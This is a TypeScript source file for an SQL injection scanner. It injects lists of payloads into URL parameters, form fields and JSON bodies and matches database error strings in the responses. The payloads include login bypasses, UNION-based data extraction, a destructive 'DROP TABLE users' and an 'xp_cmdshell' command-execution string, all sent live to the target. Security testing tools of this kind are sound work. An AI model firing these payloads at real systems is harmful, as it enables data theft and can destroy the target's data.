/**
 * SQL Injection Scanning Module
 * Identify SQL injection points in web forms and APIs
 */

export interface SQLInjectionVulnerability {
  location: string;
  parameter: string;
  payload: string;
  databaseType?: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
}

export class SQLInjectionScanner {
  private testPayloads: Map<string, string[]> = new Map([
    ['generic', [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' /*",
      "admin' --",
      "admin' #",
      "' UNION SELECT NULL--",
      "' UNION SELECT NULL,NULL--",
      "' UNION SELECT NULL,NULL,NULL--",
      "1' ORDER BY 1--",
      "1' ORDER BY 2--",
      "1' ORDER BY 3--",
    ]],
    ['mysql', [
      "' OR 1=1#",
      "' OR 1=1--",
      "admin'/*",
      "' OR 'x'='x",
      "' AND 1=1#",
      "' AND 1=2#",
      "' UNION SELECT 1,2,3#",
      "' UNION SELECT user(),database(),version()#",
    ]],
    ['postgresql', [
      "' OR 1=1--",
      "'; DROP TABLE users--",
      "' UNION SELECT NULL--",
      "' AND 1=CAST((SELECT version()) AS int)--",
    ]],
    ['mssql', [
      "' OR 1=1--",
      "'; EXEC xp_cmdshell('dir')--",
      "' UNION SELECT NULL,NULL--",
    ]],
    ['oracle', [
      "' OR 1=1--",
      "' UNION SELECT NULL FROM DUAL--",
    ]],
  ]);

  /**
   * Scan API endpoint for SQL injection
   */
  async scanAPIEndpoint(url: string, method: string = 'GET'): Promise<SQLInjectionVulnerability[]> {
    const vulnerabilities: SQLInjectionVulnerability[] = [];
    const urlObj = new URL(url);
    const params = new URLSearchParams(urlObj.search);
    
    for (const [paramName] of params.entries()) {
      for (const [dbType, payloads] of this.testPayloads.entries()) {
        for (const payload of payloads) {
          try {
            const testParams = new URLSearchParams(params);
            testParams.set(paramName, payload);
            urlObj.search = testParams.toString();
            
            const response = await fetch(urlObj.toString(), {
              method,
              headers: { 'Content-Type': 'application/json' },
            });
            
            const text = await response.text();
            
            if (this.isVulnerable(text, response.status)) {
              vulnerabilities.push({
                location: url,
                parameter: paramName,
                payload,
                databaseType: dbType !== 'generic' ? dbType : undefined,
                severity: this.calculateSeverity(payload),
                description: `SQL injection vulnerability detected in parameter: ${paramName}`,
              });
            }
          } catch (error) {
            console.error(`Error testing SQL injection:`, error);
          }
        }
      }
    }
    
    return vulnerabilities;
  }

  /**
   * Test form for SQL injection
   */
  async testForm(formSelector: string, actionUrl: string): Promise<SQLInjectionVulnerability[]> {
    const vulnerabilities: SQLInjectionVulnerability[] = [];
    const form = document.querySelector(formSelector) as HTMLFormElement;
    
    if (!form) return vulnerabilities;
    
    const inputs = form.querySelectorAll('input[type="text"], input[type="password"], textarea');
    
    for (const input of Array.from(inputs)) {
      const inputName = (input as HTMLInputElement).name || input.id;
      
      for (const [dbType, payloads] of this.testPayloads.entries()) {
        for (const payload of payloads) {
          try {
            (input as HTMLInputElement).value = payload;
            
            const formData = new FormData(form);
            const response = await fetch(actionUrl, {
              method: form.method || 'POST',
              body: formData,
            });
            
            const text = await response.text();
            
            if (this.isVulnerable(text, response.status)) {
              vulnerabilities.push({
                location: actionUrl,
                parameter: inputName,
                payload,
                databaseType: dbType !== 'generic' ? dbType : undefined,
                severity: this.calculateSeverity(payload),
                description: `SQL injection vulnerability in form field: ${inputName}`,
              });
            }
          } catch (error) {
            console.error(`Error testing form SQL injection:`, error);
          }
        }
      }
    }
    
    return vulnerabilities;
  }

  /**
   * Test JSON API for SQL injection
   */
  async testJSONAPI(url: string, jsonBody: Record<string, any>): Promise<SQLInjectionVulnerability[]> {
    const vulnerabilities: SQLInjectionVulnerability[] = [];
    
    for (const [key, value] of Object.entries(jsonBody)) {
      if (typeof value === 'string') {
        for (const [dbType, payloads] of this.testPayloads.entries()) {
          for (const payload of payloads) {
            try {
              const testBody = { ...jsonBody, [key]: payload };
              
              const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(testBody),
              });
              
              const text = await response.text();
              
              if (this.isVulnerable(text, response.status)) {
                vulnerabilities.push({
                  location: url,
                  parameter: key,
                  payload,
                  databaseType: dbType !== 'generic' ? dbType : undefined,
                  severity: this.calculateSeverity(payload),
                  description: `SQL injection vulnerability in JSON field: ${key}`,
                });
              }
            } catch (error) {
              console.error(`Error testing JSON API:`, error);
            }
          }
        }
      }
    }
    
    return vulnerabilities;
  }

  private isVulnerable(responseText: string, statusCode: number): boolean {
    // Check for SQL error messages
    const sqlErrors = [
      'SQL syntax',
      'mysql_fetch',
      'ORA-01756',
      'PostgreSQL query failed',
      'Warning: mysql_',
      'valid MySQL result',
      'MySqlClient',
      'PostgreSQL query error',
      'Warning: pg_',
      'valid PostgreSQL result',
      'Npgsql',
      'SQLiteException',
      'SQLite error',
      'SQLSTATE',
      'Microsoft OLE DB Provider',
      'ODBC SQL Server Driver',
      'SQLServer JDBC Driver',
      'Warning: odbc_',
      'Warning: mssql_',
      'Warning: sqlsrv_',
      'Warning: ibase_',
      'Warning: fbsql_',
      'Warning: ifx_',
      'Warning: oci8_',
      'Warning: ora_',
      'Warning: oci_',
      'Warning: ingres_',
      'Warning: ifx_',
      'Warning: mssql_',
      'Warning: msql_',
      'Warning: mysql_',
      'Warning: pg_',
      'Warning: sybase_',
      'Warning: db2_',
      'Warning: dbase_',
      'Warning: dba_',
      'Warning: dbx_',
      'Warning: fbsql_',
      'Warning: ibase_',
      'Warning: ifx_',
      'Warning: ingres_',
      'Warning: msql_',
      'Warning: mssql_',
      'Warning: mysql_',
      'Warning: oci8_',
      'Warning: odbc_',
      'Warning: ora_',
      'Warning: pg_',
      'Warning: sqlite_',
      'Warning: sybase_',
    ];
    
    const lowerText = responseText.toLowerCase();
    return sqlErrors.some(error => lowerText.includes(error.toLowerCase())) ||
           (statusCode === 500 && lowerText.includes('error'));
  }

  private calculateSeverity(payload: string): 'low' | 'medium' | 'high' | 'critical' {
    if (payload.includes('DROP TABLE') || payload.includes('DELETE FROM')) {
      return 'critical';
    }
    if (payload.includes('UNION SELECT') || payload.includes('xp_cmdshell')) {
      return 'high';
    }
    if (payload.includes('ORDER BY')) {
      return 'medium';
    }
    return 'low';
  }
}

